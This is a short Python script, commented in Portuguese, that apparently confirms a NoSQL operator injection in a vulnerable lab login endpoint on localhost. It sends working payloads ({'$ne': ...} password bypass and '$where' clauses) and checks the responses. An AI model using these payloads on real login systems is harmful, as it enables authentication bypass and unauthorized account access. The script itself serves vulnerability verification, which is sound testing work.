#!/usr/bin/env python3
"""Confirma a injecao de operador NoSQL na versao vulneravel."""
import argparse
import sys

import requests

FALSE_MARKER = "Invalid username or password"
TRUE_MARKER = "Account locked"


def check(name: str, condition: bool) -> bool:
    status = "OK" if condition else "FALHOU"
    print(f"[{status}] {name}")
    return condition


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", default="http://localhost:8080")
    args = parser.parse_args()
    base = args.target.rstrip("/")
    ok = True

    response = requests.post(
        f"{base}/login",
        json={"username": "carlos", "password": "invalid"},
        allow_redirects=False,
        timeout=20,
    )
    ok &= check("baseline invalido -> mensagem generica", FALSE_MARKER in response.text)

    response = requests.post(
        f"{base}/login",
        json={"username": "carlos", "password": {"$ne": "invalid"}},
        allow_redirects=False,
        timeout=20,
    )
    ok &= check("$ne aceito pelo backend (bypass de senha)", TRUE_MARKER in response.text)

    response = requests.post(
        f"{base}/login",
        json={"username": "carlos", "password": {"$ne": "invalid"}, "$where": "1"},
        allow_redirects=False,
        timeout=20,
    )
    ok &= check("$where:'1' avaliado como verdadeiro", TRUE_MARKER in response.text)

    response = requests.post(
        f"{base}/login",
        json={"username": "carlos", "password": {"$ne": "invalid"}, "$where": "0"},
        allow_redirects=False,
        timeout=20,
    )
    ok &= check("$where:'0' avaliado como falso", FALSE_MARKER in response.text)

    if ok:
        print("\n[+] Versao vulneravel confirmada: aceita operadores NoSQL.")
        return 0
    print("\n[-] Algum teste falhou (endpoint pode estar corrigido ou fora do ar).")
    return 1


if __name__ == "__main__":
    sys.exit(main())
